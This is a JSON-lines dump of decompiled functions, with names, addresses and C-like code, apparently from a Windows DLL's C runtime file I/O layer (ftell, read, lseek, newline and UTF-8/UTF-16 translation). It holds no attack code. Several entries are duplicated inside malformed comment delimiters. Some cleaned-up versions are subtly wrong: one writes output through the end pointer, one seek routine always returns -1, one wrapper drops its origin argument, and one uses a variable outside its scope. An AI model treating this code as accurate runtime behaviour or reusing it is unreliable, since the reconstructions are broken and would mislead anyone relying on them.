{"Function Name": "common_ftell_translated_utf8_nolock", "Address": "1002f815", "Source Code": "__int64 __cdecl common_ftell_translated_utf8_nolock(FILE *param_1, undefined4 param_2, uint param_3)\n{\n    uint fileDescriptor; \n    uint pointerDifference; \n    BOOL readFileSuccess; \n    byte *readBufferPointer; \n    int unusedVariable; \n    int dataIndex; \n    int dataOffset; \n    longlong divisionResult; \n    longlong seekPosition; \n    __int64 returnValue; \n    uint bytesRead; \n    undefined4 storedValue; \n    byte dataBuffer[4096]; \n    uint securityCookie; \n    \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    fileDescriptor = __fileno(param_1);\n    \n    \n    if (param_1->_base != (char *)0x0) {\n        \n        pointerDifference = (int)param_1->_ptr - param_1->_cnt;\n        \n        \n        divisionResult = __alldiv(pointerDifference, (int)pointerDifference >> 0x1f, 2, 0);\n        storedValue = (uint)divisionResult; \n        \n        \n        dataOffset = (fileDescriptor & 0x3f) * 0x30;\n        \n        \n        seekPosition = __lseeki64(fileDescriptor, (ulonglong)*(uint *)((&DAT_10050088)[(int)fileDescriptor >> 6] + 0x24 + dataOffset), 0);\n        \n        \n        dataIndex = (&DAT_10050088)[(int)fileDescriptor >> 6];\n        \n        \n        if (((seekPosition == *(int *)(dataIndex + 0x20 + dataOffset)) &&\n            ((int)((ulonglong)seekPosition >> 0x20) == *(int *)(dataIndex + 0x24 + dataOffset))) &&\n            (readFileSuccess = ReadFile(*(HANDLE *)(dataIndex + 0x18 + dataOffset), dataBuffer, 0x1000, &bytesRead, (LPOVERLAPPED)0x0), readFileSuccess != 0)) {\n            \n            \n            seekPosition = __lseeki64(fileDescriptor, (ulonglong)param_3, 0);\n            \n            \n            if ((((int)((ulonglong)seekPosition >> 0x20) != 0 && -1 < seekPosition) || (-1 < seekPosition)) &&\n                ((divisionResult < 0 || ((divisionResult < 0x100000000 && (storedValue <= bytesRead)))))) {\n                \n                dataIndex = 0; \n                readBufferPointer = dataBuffer; \n                fileDescriptor = 0; \n                \n                \n                if (storedValue != 0 || unusedVariable != 0) {\n                    do {\n                        \n                        if (dataBuffer + bytesRead <= readBufferPointer) break;\n                        \n                        \n                        if (*readBufferPointer == 0xd) {\n                            if (readBufferPointer < dataBuffer + (bytesRead - 1) && readBufferPointer[1] == 10) {\n                                readBufferPointer = readBufferPointer + 1; \n                            }\n                        } else {\n                            \n                            readBufferPointer = readBufferPointer + (char)(&DAT_1004e810)[*readBufferPointer];\n                        }\n                        \n                        fileDescriptor++; \n                        dataIndex += (uint)(0xfffffffe < fileDescriptor); \n                        readBufferPointer++; \n                    } while ((fileDescriptor != storedValue) || (dataIndex != unusedVariable)); \n                }\n            }\n        }\n    }\n    \n    \n    returnValue = ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    return returnValue; \n}"}
{"Function Name": "count_newline_bytes", "Address": "1002f9b0", "Source Code": "__int64 __cdecl count_newline_bytes(char *start_ptr, char *end_ptr, __crt_lowio_text_mode text_mode)\n{\n    uint newline_count = 0, overflow_count = 0, iterations; \n    bool is_overflow; \n    \n    if (((char)text_mode == '\\x01') || ((char)text_mode == '\\x02')) {\n        \n        iterations = ~-(uint)(end_ptr < start_ptr) & (uint)(end_ptr + (1 - (int)start_ptr)) >> 1;\n        if (iterations != 0) { \n            do {\n                \n                if (*(short *)start_ptr == 10) {\n                    is_overflow = 0xfffffffe < overflow_count; \n                    overflow_count++; \n                    newline_count += is_overflow; \n                }\n                start_ptr += 2; \n            } while (--iterations != 0); \n        }\n    } else {\n        \n        iterations = ~-(uint)(end_ptr < start_ptr) & (int)end_ptr - (int)start_ptr;\n        if (iterations != 0) { \n            do {\n                \n                if (*start_ptr == '\\n') {\n                    is_overflow = 0xfffffffe < overflow_count; \n                    overflow_count++; \n                    newline_count += is_overflow; \n                }\n                start_ptr++; \n            } while (--iterations != 0); \n        }\n    }\n    return CONCAT44(newline_count, overflow_count); \n}"}
{"Function Name": "FUN_1002fa2e", "Address": "1002fa2e", "Source Code": "longlong __cdecl get_file_position(FILE *file_pointer) \n{\n    return get_file_offset<__int64>(file_pointer); \n}"}
{"Function Name": "FUN_1002fa39", "Address": "1002fa39", "Source Code": "longlong __cdecl FUN_1002fa39(FILE *file_pointer) \n{\n    return FUN_1002f4fc(file_pointer); \n}"}
{"Function Name": "common_flush_and_write_nolock<char>", "Address": "1002fa44", "Source Code": "\\*\nuint __cdecl common_flush_and_write_nolock<char>(byte byteToWrite, FILE *filePointer)\n{\n    \n    int fileDescriptor = __fileno(filePointer);\n    \n    \n    if ((filePointer->_flag & 6U) == 0) {\n        \n        *(undefined4 *)FUN_100253b8() = 9;\n    } else {\n        \n        if (((uint)filePointer->_flag >> 0xc & 1) == 0) {\n            \n            if ((filePointer->_flag & 1U) != 0) {\n                \n                filePointer->_base = (char *)0x0;\n                \n                \n                if (((uint)filePointer->_flag >> 3 & 1) == 0) goto LAB_1002fa6e;\n                \n                \n                filePointer->_ptr = (char *)filePointer->_cnt;\n                \n                \n                LOCK();\n                \n                filePointer->_flag &= 0xfffffffe;\n                \n                UNLOCK();\n            }\n            \n            LOCK();\n            \n            filePointer->_flag |= 2;\n            \n            UNLOCK();\n            \n            LOCK();\n            \n            filePointer->_flag &= 0xfffffff7;\n            \n            UNLOCK();\n            \n            filePointer->_base = (char *)0x0;\n            \n            \n            if (((filePointer->_flag & 0x4c0U) == 0) &&\n                (((filePointer != (FILE *)___acrt_iob_func(1) &&\n                filePointer != (FILE *)___acrt_iob_func(2)) ||\n                (fileDescriptor = __isatty(fileDescriptor), fileDescriptor == 0)))) {\n                \n                ___acrt_stdio_allocate_buffer_nolock(&filePointer->_ptr);\n            }\n            \n            uint writeResult = write_buffer_nolock<char>(byteToWrite, filePointer);\n            \n            \n            if ((char)writeResult == '\\0') {\n                \n                LOCK();\n                \n                filePointer->_flag |= 0x10;\n                \n                UNLOCK();\n                \n                return 0xffffffff;\n            }\n            \n            return (uint)byteToWrite;\n        }\n        \n        *(undefined4 *)FUN_100253b8() = 0x22;\n    }\nLAB_1002fa6e:\n    \n    LOCK();\n    \n    filePointer->_flag |= 0x10;\n    \n    UNLOCK();\n    \n    return 0xffffffff;\n}\n*\\ \n \nuint __cdecl common_flush_and_write_nolock<char>(byte byteToWrite, FILE *filePointer)\n{\n    int fileDescriptor = __fileno(filePointer);\n    if ((filePointer->_flag & 6U) == 0) {\n        *(undefined4 *)FUN_100253b8() = 9;\n    } else {\n        if (((uint)filePointer->_flag >> 0xc & 1) == 0) {\n            if ((filePointer->_flag & 1U) != 0) {\n                filePointer->_base = (char *)0x0;\n                if (((uint)filePointer->_flag >> 3 & 1) == 0) goto LAB_1002fa6e;\n                filePointer->_ptr = (char *)filePointer->_cnt;\n                LOCK();\n                filePointer->_flag &= 0xfffffffe;\n                UNLOCK();\n            }\n            LOCK();\n            filePointer->_flag |= 2;\n            UNLOCK();\n            LOCK();\n            filePointer->_flag &= 0xfffffff7;\n            UNLOCK();\n            filePointer->_base = (char *)0x0;\n            if (((filePointer->_flag & 0x4c0U) == 0) &&\n                (((filePointer != (FILE *)___acrt_iob_func(1) &&\n                filePointer != (FILE *)___acrt_iob_func(2)) ||\n                (fileDescriptor = __isatty(fileDescriptor), fileDescriptor == 0)))) {\n                ___acrt_stdio_allocate_buffer_nolock(&filePointer->_ptr);\n            }\n            uint writeResult = write_buffer_nolock<char>(byteToWrite, filePointer);\n            if ((char)writeResult == '\\0') {\n                LOCK();\n                filePointer->_flag |= 0x10;\n                UNLOCK();\n                return 0xffffffff;\n            }\n            return (uint)byteToWrite;\n        }\n        *(undefined4 *)FUN_100253b8() = 0x22;\n    }\nLAB_1002fa6e:\n    LOCK();\n    filePointer->_flag |= 0x10;\n    UNLOCK();\n    return 0xffffffff;\n}"}
{"Function Name": "write_buffer_nolock<char>", "Address": "1002fb55", "Source Code": "\\*\nuint __cdecl write_buffer_nolock<char>(undefined param_1, FILE *param_2)\n{\n    \n    uint file_handle = __fileno(param_2);\n    bool success_flag;\n    \n    if ((param_2->_flag & 0xc0U) == 0) {\n        \n        success_flag = __write(file_handle, &param_1, 1) == 1;\n    } else {\n        \n        uint max_char_count = (int)param_2->_ptr - param_2->_cnt;\n        \n        param_2->_ptr = (char *)(param_2->_cnt + 1);\n        \n        param_2->_base = (char *)(param_2->_bufsiz - 1);\n        \n        \n        if ((int)max_char_count < 1) {\n            \n            if ((file_handle == 0xffffffff) || (file_handle == 0xfffffffe)) {\n                undefined *pointer_var = &DAT_1004e2b8; \n            } else {\n                \n                undefined *pointer_var = (undefined *)((file_handle & 0x3f) * 0x30 + (&DAT_10050088)[(int)file_handle >> 6]);\n            }\n            \n            if ((pointer_var[0x28] & 0x20) != 0 && __lseeki64(file_handle, 0x200000000, 0) == -1) {\n                LOCK(); \n                param_2->_flag |= 0x10; \n                UNLOCK(); \n                return 1; \n            }\n        } else {\n            \n            __write(file_handle, (void *)param_2->_cnt, max_char_count);\n        }\n        \n        *(undefined *)param_2->_cnt = param_1;\n        success_flag = true; \n    }\n    \n    return (uint)success_flag;\n}\n*\\ \n \nuint __cdecl write_buffer_nolock<char>(undefined param_1, FILE *param_2)\n{\n    uint file_handle = __fileno(param_2);\n    bool success_flag;\n    if ((param_2->_flag & 0xc0U) == 0) {\n        success_flag = __write(file_handle, &param_1, 1) == 1;\n    } else {\n        uint max_char_count = (int)param_2->_ptr - param_2->_cnt;\n        param_2->_ptr = (char *)(param_2->_cnt + 1);\n        param_2->_base = (char *)(param_2->_bufsiz - 1);\n        \n        if ((int)max_char_count < 1) {\n            if ((file_handle == 0xffffffff) || (file_handle == 0xfffffffe)) {\n                undefined *pointer_var = &DAT_1004e2b8;\n            } else {\n                undefined *pointer_var = (undefined *)((file_handle & 0x3f) * 0x30 + (&DAT_10050088)[(int)file_handle >> 6]);\n            }\n            if ((pointer_var[0x28] & 0x20) != 0 && __lseeki64(file_handle, 0x200000000, 0) == -1) {\n                LOCK();\n                param_2->_flag |= 0x10;\n                UNLOCK();\n                return 1;\n            }\n        } else {\n            __write(file_handle, (void *)param_2->_cnt, max_char_count);\n        }\n        *(undefined *)param_2->_cnt = param_1;\n        success_flag = true;\n    }\n    return (uint)success_flag;\n}"}
{"Function Name": "FUN_1002fc21", "Address": "1002fc21", "Source Code": "void __cdecl FUN_1002fc21(byte data_byte, FILE *file_pointer)\n{\n    \n    common_flush_and_write_nolock(data_byte, file_pointer);\n}"}
{"Function Name": "translate_text_mode_nolock<char>", "Address": "1002fc2c", "Source Code": "\\*\nint __cdecl translate_text_mode_nolock<char>(int param_1, char *param_2, uint param_3)\n{\n    byte *bytePointer; \n    char currentChar; \n    byte byteValue; \n    int lookupValue; \n    BOOL booleanFlag; \n    char *inputIterator; \n    char *outputIterator; \n    int calculatedIndex; \n    HANDLE resourceHandle; \n    char unusedChar; \n    DWORD unusedDWORD; \n    calculatedIndex = param_1 >> 6; \n    lookupValue = (&DAT_10050088)[calculatedIndex]; \n    resourceHandle = *(HANDLE *)(lookupValue + 0x18 + ((param_1 & 0x3fU) * 0x30)); \n    \n    bytePointer = (byte *)(lookupValue + 0x28 + ((param_1 & 0x3fU) * 0x30)); \n    if ((param_3 == 0) || (*param_2 != '\\n')) { \n        *bytePointer &= 0xfb; \n    } else {\n        *bytePointer |= 4; \n    }\n    outputIterator = param_2; \n    char *endPointer = param_2 + param_3; \n    for (inputIterator = param_2; inputIterator < endPointer; inputIterator++) { \n        currentChar = *inputIterator; \n        if (currentChar == '\\x1a') { \n            byteValue = *bytePointer; \n            if ((byteValue & 0x40) == 0) { \n                *bytePointer |= 2; \n            } else {\n                *outputIterator++ = currentChar; \n            }\n            break; \n        }\n        if (currentChar != '\\r') { \n            *outputIterator++ = currentChar; \n        } else if (inputIterator + 1 < endPointer && *(inputIterator + 1) == '\\n') { \n            *outputIterator++ = '\\n'; \n            inputIterator++; \n        } else {\n            *outputIterator++ = '\\r'; \n        }\n    }\n    return (int)outputIterator - (int)param_2; \n}\n*\\ \n \nint __cdecl translate_text_mode_nolock<char>(int param_1, char *param_2, uint param_3)\n{\n    byte *bytePointer;\n    char currentChar;\n    byte byteValue;\n    int lookupValue;\n    BOOL booleanFlag;\n    char *inputIterator;\n    char *outputIterator;\n    int calculatedIndex;\n    HANDLE resourceHandle;\n    char unusedChar;\n    DWORD unusedDWORD;\n    calculatedIndex = param_1 >> 6;\n    lookupValue = (&DAT_10050088)[calculatedIndex];\n    resourceHandle = *(HANDLE *)(lookupValue + 0x18 + ((param_1 & 0x3fU) * 0x30));\n    \n    bytePointer = (byte *)(lookupValue + 0x28 + ((param_1 & 0x3fU) * 0x30));\n    if ((param_3 == 0) || (*param_2 != '\\n')) {\n        *bytePointer &= 0xfb;\n    } else {\n        *bytePointer |= 4;\n    }\n    outputIterator = param_2;\n    char *endPointer = param_2 + param_3;\n    for (inputIterator = param_2; inputIterator < endPointer; inputIterator++) {\n        currentChar = *inputIterator;\n        if (currentChar == '\\x1a') {\n            byteValue = *bytePointer;\n            if ((byteValue & 0x40) == 0) {\n                *bytePointer |= 2;\n            } else {\n                *outputIterator++ = currentChar;\n            }\n            break;\n        }\n        if (currentChar != '\\r') {\n            *outputIterator++ = currentChar;\n        } else if (inputIterator + 1 < endPointer && *(inputIterator + 1) == '\\n') {\n            *outputIterator++ = '\\n';\n            inputIterator++;\n        } else {\n            *outputIterator++ = '\\r';\n        }\n    }\n    return (int)outputIterator - (int)param_2;\n}"}
{"Function Name": "FUN_1002fd83", "Address": "1002fd83", "Source Code": "uint __cdecl FUN_1002fd83(uint param_1, short *param_2, int param_3)\n{\n    byte *bytePointer; \n    short currentShortValue; \n    BOOL readSuccess; \n    short *currentPosition; \n    short *endPosition; \n    int baseAddress; \n    int offset; \n    DWORD bytesRead; \n    HANDLE fileHandle; \n    \n    offset = (param_1 & 0x3f) * 0x30;\n    \n    baseAddress = (&DAT_10050088)[param_1 >> 6];\n    \n    fileHandle = *(HANDLE *)(baseAddress + 0x18 + offset);\n    \n    \n    bytePointer = (byte *)(baseAddress + 0x28 + offset);\n    \n    if ((param_3 == 0) || (*param_2 != 10)) {\n        \n        *bytePointer &= 0xfb;\n    } else {\n        \n        *bytePointer |= 4;\n    }\n    \n    \n    endPosition = param_2 + param_3;\n    currentPosition = param_2;\n    \n    while (currentPosition < endPosition) {\n        \n        currentShortValue = *currentPosition;\n        \n        if (currentShortValue == 0x1a) {\n            \n            if ((*bytePointer & 0x40) == 0) {\n                \n                *bytePointer |= 2;\n            } else {\n                \n                *endPosition++ = currentShortValue;\n            }\n            break; \n        }\n        \n        if (currentShortValue == 0xd) {\n            \n            if (currentPosition + 1 < endPosition) {\n                \n                if (*(currentPosition + 1) == 10) {\n                    \n                    *endPosition++ = 10;\n                    currentPosition += 2; \n                    continue; \n                }\n                \n                *endPosition++ = 0xd;\n                currentPosition++; \n            } else {\n                \n                readSuccess = ReadFile(fileHandle, bytesRead, 2, &bytesRead, (LPOVERLAPPED)0x0);\n                \n                if (readSuccess == 0 || bytesRead == 0) {\n                    \n                    *endPosition++ = 0xd;\n                } else {\n                    \n                    if ((*(bytePointer) & 0x48) == 0) {\n                        \n                        if (bytesRead[0] == 10 && endPosition == param_2) {\n                            \n                            *endPosition++ = 10;\n                            continue; \n                        }\n                        \n                        __lseeki64_nolock(param_1, 0x1ffffffff, 0);\n                        \n                        if (bytesRead[0] == 10) {\n                            \n                            *endPosition++ = 0xd;\n                        } else {\n                            \n                            *endPosition++ = 0xd;\n                            \n                            *(char *)(baseAddress + 0x2a + offset) = (char)bytesRead[0];\n                            *(char *)(baseAddress + 0x2b + offset) = (char)((ushort)bytesRead[0] >> 8);\n                            *(undefined *)(baseAddress + 0x2c + offset) = 10; \n                        }\n                    } else {\n                        \n                        *endPosition++ = 0xd;\n                    }\n                }\n            }\n        } else {\n            \n            *endPosition++ = currentShortValue;\n        }\n        currentPosition++; \n    }\n    \n    return (int)endPosition - (int)param_2 & 0xfffffffe;\n}"}
{"Function Name": "translate_ansi_or_utf8_nolock", "Address": "1002ff3a", "Source Code": "int __cdecl\ntranslate_ansi_or_utf8_nolock(int param_1, char *param_2, uint param_3, wchar_t *param_4, uint param_5)\n{\n    int iVar3; \n    int iVar2; \n    uint uVar7; \n    byte *pbVar8; \n    byte *pbVar9; \n    \n    iVar3 = translate_text_mode_nolock<char>(param_1, param_2, param_3);\n    if (iVar3 == 0) { \n        return 0; \n    }\n    \n    \n    iVar2 = (&DAT_10050088)[param_1 >> 6];\n    int iVar10 = (param_1 & 0x3fU) * 0x30; \n    \n    if (*(char *)(iVar2 + 0x29 + iVar10) != '\\0') {\n        pbVar8 = (byte *)(param_2 + iVar3 - 1); \n        byte bVar1 = *pbVar8; \n        \n        \n        if ((char)bVar1 < '\\0') {\n            uVar7 = 1; \n            \n            while ((((&DAT_1004e810)[bVar1] == '\\0' && (uVar7 < 5)) && (param_2 <= pbVar8))) {\n                pbVar8--; \n                uVar7++; \n                bVar1 = *pbVar8; \n            }\n            \n            if ((char)(&DAT_1004e810)[*pbVar8] == 0) {\n                *(undefined4 *)FUN_100253b8() = 0x2a; \n                return -1; \n            }\n            \n            if ((int)(char)(&DAT_1004e810)[*pbVar8] + 1U == uVar7) {\n                pbVar8 += uVar7; \n            } else if ((*(byte *)(iVar2 + 0x28 + iVar10) & 0x48) == 0) {\n                __lseeki64_nolock(param_1, CONCAT44(1, (int)-uVar7 >> 0x1f), 0); \n            } else {\n                pbVar9 = pbVar8 + 1; \n                *(byte *)(iVar2 + 0x2a + iVar10) = *pbVar8; \n                if (1 < uVar7) {\n                    *(byte *)((&DAT_10050088)[param_1 >> 6] + 0x2b + iVar10) = *pbVar9; \n                }\n                if (uVar7 == 3) {\n                    *(byte *)((&DAT_10050088)[param_1 >> 6] + 0x2c + iVar10) = *(pbVar9 + 1); \n                }\n                pbVar8 = pbVar9 - uVar7; \n            }\n        } else {\n            pbVar8++; \n        }\n    } else {\n        pbVar8++; \n    }\n    \n    iVar3 = MultiByteToWideChar(0xfde9, 0, param_2, (int)pbVar8 - (int)param_2, param_4, param_5);\n    if (iVar3 == 0) { \n        ___acrt_errno_map_os_error(GetLastError()); \n        return -1; \n    }\n    \n    pbVar9 = (byte *)((&DAT_10050088)[param_1 >> 6] + 0x2d + iVar10); \n    \n    *pbVar9 ^= ((iVar3 != (int)pbVar8 - (int)param_2) * '\\x02' ^ *pbVar9) & 2;\n    \n    return iVar3 * 2; \n}"}
{"Function Name": "translate_utf16_from_console_nolock", "Address": "1003008a", "Source Code": "int __cdecl translate_utf16_from_console_nolock(int input_param, wchar_t *input_buffer, uint buffer_length)\n{\n    \n    wchar_t *end_pointer = input_buffer + buffer_length;\n    \n    wchar_t *output_pointer = input_buffer;\n    \n    if (input_buffer < end_pointer) {\n        \n        wchar_t *read_pointer = input_buffer;\n        wchar_t *next_pointer = input_buffer + 1;\n        \n        do {\n            \n            wchar_t current_char = *read_pointer;\n            \n            if (current_char == L'\\x1a') {\n                \n                byte *flag_pointer = (byte *)((&DAT_10050088)[input_param >> 6] + 0x28 + (input_param & 0x3fU) * 0x30);\n                *flag_pointer |= 2; \n                break; \n            }\n            \n            if (current_char == L'\\r' && next_pointer < end_pointer && *next_pointer == L'\\n') {\n                \n                read_pointer += 2; \n                *output_pointer++ = L'\\n'; \n                next_pointer += 2; \n            } else {\n                \n                *output_pointer++ = current_char; \n                read_pointer++; \n                next_pointer++; \n            }\n        } while (read_pointer < end_pointer); \n    }\n    \n    return (int)(output_pointer - input_buffer) & 0xfffffffe;\n}"}
{"Function Name": "__read_nolock", "Address": "1003021e", "Source Code": "int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)\n{\nundefined4 *puVar1;\nwchar_t *pwVar2;\nint iVar3;\nBOOL BVar4;\nulong uVar5;\nuint uVar6;\nint unaff_ESI;\nwchar_t *_Memory;\nint iVar7;\nuint uVar8;\nlonglong lVar9;\nDWORD local_2c;\nwchar_t *local_28;\nuint local_24;\nHANDLE local_20;\nint local_1c;\nuint local_18;\nint local_14;\nsize_t local_10;\nwchar_t *local_c;\nchar local_6;\nbyte local_5;\nif (_FileHandle == -2) {\npuVar1 = (undefined4 *)FUN_100253a5();\n*puVar1 = 0;\npuVar1 = (undefined4 *)FUN_100253b8();\n*puVar1 = 9;\nreturn -1;\n}\nif ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_10050288)) {\nlocal_18 = 1;\niVar7 = _FileHandle >> 6;\nlocal_1c = (_FileHandle & 0x3fU) * 0x30;\niVar3 = (&DAT_10050088)[iVar7];\nlocal_5 = *(byte *)(local_1c + 0x28 + iVar3);\nlocal_14 = iVar7;\nif ((local_5 & 1) != 0) {\nif (_MaxCharCount < 0x80000000) {\nif ((_MaxCharCount == 0) || ((local_5 & 2) != 0)) {\nreturn 0;\n}\nif (_DstBuf != (void *)0x0) {\nlocal_20 = *(HANDLE *)(local_1c + 0x18 + iVar3);\nlocal_5 = *(char *)(local_1c + 0x29 + iVar3);\nif (local_5 == '\\x01') {\nif ((~(byte)_MaxCharCount & 1) == 0) goto LAB_10030307;\nlocal_10 = 4;\nif (3 < _MaxCharCount >> 1) {\nlocal_10 = _MaxCharCount >> 1;\n}\npwVar2 = (wchar_t *)__malloc_base(local_10);\nFID_conflict__free((void *)0x0);\nFID_conflict__free((void *)0x0);\nlocal_c = pwVar2;\nif (pwVar2 != (wchar_t *)0x0) {\nlVar9 = __lseeki64_nolock(_FileHandle,(ulonglong)local_18 << 0x20,unaff_ESI);\niVar3 = (&DAT_10050088)[iVar7];\n*(int *)(local_1c + 0x20 + iVar3) = (int)lVar9;\n*(int *)(local_1c + 0x24 + iVar3) = (int)((ulonglong)lVar9 >> 0x20);\n_Memory = pwVar2;\ngoto LAB_10030398;\n}\npuVar1 = (undefined4 *)FUN_100253b8();\n*puVar1 = 0xc;\npuVar1 = (undefined4 *)FUN_100253a5();\n*puVar1 = 8;\n}\nelse if ((local_5 == '\\x02') && ((~_MaxCharCount & 1) == 0)) {\nLAB_10030307:\npuVar1 = (undefined4 *)FUN_100253a5();\n*puVar1 = 0;\npuVar1 = (undefined4 *)FUN_100253b8();\n*puVar1 = 0x16;\nFUN_1001de96();\npwVar2 = (wchar_t *)0x0;\n}\nelse {\nlocal_10 = _MaxCharCount;\nlocal_c = (wchar_t *)_DstBuf;\npwVar2 = (wchar_t *)_DstBuf;\n_Memory = (wchar_t *)0x0;\nLAB_10030398:\nuVar8 = 0;\nlocal_24 = (&DAT_10050088)[local_14];\nuVar6 = local_10;\nif ((((*(byte *)(local_1c + 0x28 + local_24) & 0x48) != 0) &&\n(local_6 = *(char *)(local_1c + 0x2a + local_24), local_6 != '\\n')) &&\n(local_10 != 0)) {\n*(char *)pwVar2 = local_6;\nlocal_c = (wchar_t *)((int)pwVar2 + 1);\nuVar6 = local_10 - 1;\n*(undefined *)(local_1c + 0x2a + (&DAT_10050088)[local_14]) = 10;\nuVar8 = local_18;\nif (((local_5 != '\\0') &&\n(local_6 = *(char *)(local_1c + 0x2b + (&DAT_10050088)[local_14]), local_6 != '\\n'\n)) && (uVar6 != 0)) {\nuVar8 = 2;\n*(char *)local_c = local_6;\nlocal_c = pwVar2 + 1;\nuVar6 = local_10 - 2;\n*(undefined *)(local_1c + 0x2b + (&DAT_10050088)[local_14]) = 10;\nif (((local_5 == (char)local_18) &&\n(local_6 = *(char *)(local_1c + 0x2c + (&DAT_10050088)[local_14]),\nlocal_6 != '\\n')) && (uVar6 != 0)) {\nuVar8 = 3;\n*(char *)local_c = local_6;\nlocal_c = (wchar_t *)((int)pwVar2 + 3);\n*(undefined *)(local_1c + 0x2c + (&DAT_10050088)[local_14]) = 10;\nuVar6 = local_10 - 3;\n}\n}\n}\nlocal_10 = uVar6;\nlocal_28 = pwVar2;\niVar3 = __isatty(_FileHandle);\npwVar2 = _Memory;\nif (((iVar3 == 0) ||\n((*(byte *)(local_1c + 0x28 + (&DAT_10050088)[local_14]) & 0x80) == 0)) ||\n(BVar4 = GetConsoleMode(local_20,&local_2c), BVar4 == 0)) {\nlocal_18 = local_18 & 0xffffff00;\nLAB_10030506:\nBVar4 = ReadFile(local_20,local_c,local_10,&local_24,(LPOVERLAPPED)0x0);\nif ((BVar4 != 0) && (uVar6 = local_24, local_24 <= _MaxCharCount)) {\nLAB_1003052b:\nuVar8 = uVar8 + uVar6;\nif ((*(byte *)(local_1c + 0x28 + (&DAT_10050088)[local_14]) & 0x80) != 0) {\nif (local_5 == '\\x02') {\nif ((char)local_18 == '\\0') {\nuVar8 = FUN_1002fd83(_FileHandle,local_28,uVar8 >> 1);\n}\nelse {\nuVar8 = translate_utf16_from_console_nolock(_FileHandle,local_28,uVar8 >> 1);\n}\n}\nelse {\nuVar8 = translate_ansi_or_utf8_nolock\n(_FileHandle,(char *)local_c,uVar8,(wchar_t *)_DstBuf,\n_MaxCharCount >> 1);\n}\n}\ngoto LAB_100304e8;\n}\nuVar5 = GetLastError();\nif (uVar5 != 5) {\nif (uVar5 == 0x6d) {\nuVar8 = 0;\ngoto LAB_100304e8;\n}\ngoto LAB_100304de;\n}\npuVar1 = (undefined4 *)FUN_100253b8();\n*puVar1 = 9;\npuVar1 = (undefined4 *)FUN_100253a5();\n*puVar1 = 5;\n}\nelse {\nif (local_5 != '\\x02') goto LAB_10030506;\nBVar4 = ReadConsoleW(local_20,local_c,local_10 >> 1,&local_24,\n(PCONSOLE_READCONSOLE_CONTROL)0x0);\nif (BVar4 != 0) {\nuVar6 = local_24 * 2;\ngoto LAB_1003052b;\n}\nuVar5 = GetLastError();\nLAB_100304de:\n___acrt_errno_map_os_error(uVar5);\n}\n}\nuVar8 = 0xffffffff;\n_Memory = pwVar2;\nLAB_100304e8:\nFID_conflict__free(_Memory);\nreturn uVar8;\n}\n}\npuVar1 = (undefined4 *)FUN_100253a5();\n*puVar1 = 0;\npuVar1 = (undefined4 *)FUN_100253b8();\n*puVar1 = 0x16;\ngoto LAB_100305c5;\n}\n}\npuVar1 = (undefined4 *)FUN_100253a5();\n*puVar1 = 0;\npuVar1 = (undefined4 *)FUN_100253b8();\n*puVar1 = 9;\nLAB_100305c5:\nFUN_1001de96();\nreturn -1;\n}\nLocal Variable: local_5 : undefined1\nLocal Variable: local_6 : undefined1\nLocal Variable: local_c : undefined4\nLocal Variable: local_10 : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_18 : undefined4\nLocal Variable: local_1c : undefined4\nLocal Variable: local_20 : undefined4\nLocal Variable: local_24 : undefined4\nLocal Variable: local_28 : undefined4\nLocal Variable: local_2c : undefined1"}
{"Function Name": "common_lseek_nolock<__int64>", "Address": "100306d8", "Source Code": "\\*\n__int64 __cdecl common_lseek_nolock<__int64>(int fileDescriptor, __int64 distanceToMove, int unusedParam)\n{\n    LARGE_INTEGER filePointerMovement; \n    HANDLE fileHandle; \n    BOOL isPointerMoved; \n    DWORD lastErrorCode; \n    fileHandle = (HANDLE)__get_osfhandle(fileDescriptor); \n    if (fileHandle == (HANDLE)0xffffffff) { \n        *(undefined4 *)FUN_100253b8() = 9; \n    } else {\n        filePointerMovement.s.LowPart = (undefined4)distanceToMove; \n        isPointerMoved = SetFilePointerEx(fileHandle, filePointerMovement, &distanceToMove._4_4_, 0); \n        if (isPointerMoved == 0) { \n            lastErrorCode = GetLastError(); \n            ___acrt_errno_map_os_error(lastErrorCode); \n        } else if ((distanceToMove & 0xffffffff) != 0xffffffff) { \n            byte *bytePointer = (byte *)((&DAT_10050088)[fileDescriptor >> 6] + 0x28 + (fileDescriptor & 0x3fU) * 0x30); \n            *bytePointer = *bytePointer & 0xfd; \n        }\n    }\n    return 0xffffffff; \n}\n*\\ \n \n__int64 __cdecl common_lseek_nolock<__int64>(int fileDescriptor, __int64 distanceToMove, int unusedParam)\n{\n    LARGE_INTEGER filePointerMovement;\n    HANDLE fileHandle;\n    BOOL isPointerMoved;\n    DWORD lastErrorCode;\n    fileHandle = (HANDLE)__get_osfhandle(fileDescriptor);\n    if (fileHandle == (HANDLE)0xffffffff) {\n        *(undefined4 *)FUN_100253b8() = 9;\n    } else {\n        filePointerMovement.s.LowPart = (undefined4)distanceToMove;\n        isPointerMoved = SetFilePointerEx(fileHandle, filePointerMovement, &distanceToMove._4_4_, 0);\n        if (isPointerMoved == 0) {\n            lastErrorCode = GetLastError();\n            ___acrt_errno_map_os_error(lastErrorCode);\n        } else if ((distanceToMove & 0xffffffff) != 0xffffffff) {\n            byte *bytePointer = (byte *)((&DAT_10050088)[fileDescriptor >> 6] + 0x28 + (fileDescriptor & 0x3fU) * 0x30);\n            *bytePointer = *bytePointer & 0xfd;\n        }\n    }\n    return 0xffffffff;\n}"}
{"Function Name": "__lseeki64", "Address": "10030756", "Source Code": "longlong __cdecl __lseeki64(int file_handle, longlong offset, int origin)\n{\n    \n    \n    return common_lseek<__int64>(file_handle, offset, 0);\n}"}
{"Function Name": "__lseeki64_nolock", "Address": "10030771", "Source Code": "longlong __cdecl __lseeki64_nolock(int file_handle, longlong offset, int origin)\n{\n    \n    return common_lseek_nolock<__int64>(file_handle, offset, 0);\n}"}
